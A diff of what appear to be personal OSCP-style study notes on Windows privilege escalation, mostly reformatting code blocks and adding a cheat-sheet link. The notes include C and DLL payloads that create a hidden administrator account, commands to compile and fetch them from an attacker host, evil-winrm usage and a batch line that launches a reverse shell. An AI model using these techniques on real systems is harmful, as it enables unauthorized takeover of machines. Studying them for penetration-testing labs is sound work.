@@ -1,3 +1,4 @@
+<p><a href="https://khaelkugler.com/pdf/Windows_Privilege_Escalation_Module_Cheat_Sheet.pdf">HTB Windows Privesc Checklist</a></p>
 <h3 id="enumerating-windows">Enumerating Windows</h3>
 <p><strong>Windows Privilege and Access Control</strong></p>
 <ul>
@@ -102,7 +103,7 @@
 <li>Basically a better shell that provides pass-the-hash, in-memory loading, file upload/download, etc. from kali</li>
 <li>Download a file with <code>download {filename}</code></li>
 <li>Upload a file with <code>upload {filename}</code></li>
-<li><code>evil-winrm -i {IP} -u {username} -p {password} (-H hash}</code></li>
+<li><code>evil-winrm -i {IP} -u {username} -p {password}</code></li>
 <li>Can also be provided keys<ul>
 <li><code>evil-winrm -i {IP} -c certificate.pem -k priv-key.pem -S</code></li>
 </ul>
@@ -116,12 +117,10 @@
 <li><code>winpeas.exe --fileanalysis</code></li>
 <li>available at <code>https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</code></li>
 <li>host it, download it, run it</li>
-<li>Can miss stuff, and knowing OSCP it will. </li>
+<li>Can miss stuff, and knowing OSCP it will.</li>
 </ul>
 </li>
 <li>PowerUp powershell script<ul>
-  <li>Get the file from kali with <code>iwr {kali_IP}:{kali_port} -o PowerUp.ps1</code></li>
-  <li>Run <code>powershell -ep bypass</code> first</li>
 <li><a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></li>
 </ul>
 </li>
@@ -147,29 +146,31 @@
 <li>W - Write only access</li>
 </ul>
 </li>
-<li><p>If a user has full control over a binary with higher permissions (like a MySQL daemon), we can edit the executable and it will be run with higher permissions</p>
-<ul>
+<li>If a user has full control over a binary with higher permissions (like a MySQL daemon), we can edit the executable and it will be run with higher permissions<ul>
 <li>This can occur due to full permissions being an easy solution for sysadmins</li>
 <li>This binary can be as simple as creating an administrative user with <code>system()</code></li>
 <li><code>sudo apt install mingw-w64</code></li>
 <li><code>x86_64-w64-mingw32-gcc newuser.c -o newuser.exe</code><ul>
 <li><code>python3 -m http.server</code></li>
-<li><code>iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe</code>
-```
-#include <stdlib.h>
+<li><code>iwr -uri http://{kali_IP}:8000/newuser.exe -Outfile newuser.exe</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>#include &lt;stdlib.h&gt;
 int main ()
 {
-int i;</li>
-</ul>
-</li>
-</ul>
-<p>i = system (&quot;net user kali Password123! /add&quot;);
-i = system (&quot;net localgroup administrators kali /add&quot;);
-i = system (&quot;net localgroup &quot;Remote Desktop Users&quot; kali /add&quot;);</p>
-<p>return 0;
+  int i;
+  
+  i = system (&quot;net user kali Password123! /add&quot;);
+  i = system (&quot;net localgroup administrators kali /add&quot;);
+  i = system (&quot;net localgroup &quot;Remote Desktop Users&quot; kali /add&quot;);
+  
+  return 0;
 }
-```</p>
-</li>
+</code></pre>
+<ul>
 <li>Then, move the normal executable out from it&#39;s usual location, move ours in, and then figure out how to restart the service (so it uses the exe)</li>
 <li>Restarting the service<ul>
 <li>Could be as simple as <code>net stop {service}</code>, but access will likely be denied</li>
@@ -199,16 +200,16 @@ i = system (&quot;net localgroup &quot;Remote Desktop Users&quot; kali /add&quot
 <li>When making the DLL, we can again simply add an administrative user to the system using something like the following inside of <code>case DLL_PROCESS_ATTACH</code>:<ul>
 <li><code>int i; i = system(&quot;net user /ADD tempuser&quot;); i = system(&quot;net localgroups administrators /ADD tempuser&quot;); break;</code></li>
 <li>MinGW can compile C++ code into DLLs with the <code>--shared</code> flag<ul>
-<li><code>x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll</code>
-```
-#include <stdlib.h>
-#include <windows.h></li>
+<li><code>x86_64-w64-mingw32-gcc dll.cpp --shared -o dll.dll</code></li>
 </ul>
 </li>
 </ul>
 </li>
 </ul>
-<p>BOOL APIENTRY DllMain(
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
 HANDLE hModule,// Handle to DLL module
 DWORD ul_reason_for_call,// Reason for calling function
 LPVOID lpReserved ) // Reserved
@@ -229,12 +230,14 @@ LPVOID lpReserved ) // Reserved
         break;
     }
     return TRUE;
-}</p>
-<pre><code>
-**.bat <span class="hljs-built_in">files</span>**
-- Just call <span class="hljs-keyword">an</span> executable inside <span class="hljs-keyword">the</span> batch <span class="hljs-built_in">file</span>
-</code></pre><p>C:\Users\Public\reverseshell.exe
-```</p>
+}
+</code></pre>
+<p><strong>.bat files</strong></p>
+<ul>
+<li>Just call an executable inside the batch file</li>
+</ul>
+<pre><code>C:\Users\Public\reverseshell.exe
+</code></pre>
 <p><strong>Abusing Unquoted Service Paths</strong></p>
 <ul>
 <li>This occurs when we can write to a service&#39;s main directory without being able to modify the current files</li>
@@ -373,7 +376,7 @@ LPVOID lpReserved ) // Reserved
 </ul>
 </li>
 </ul>
-<h3 id="what-to-do-after-escalating-privileges-">What to do after escalating privileges?</h3>
+<h3 id="what-to-do-after-escalating-privileges">What to do after escalating privileges?</h3>
 <ul>
 <li>Credentials Credentials Credentials<ul>
 <li>Run WinPEAS again</li>
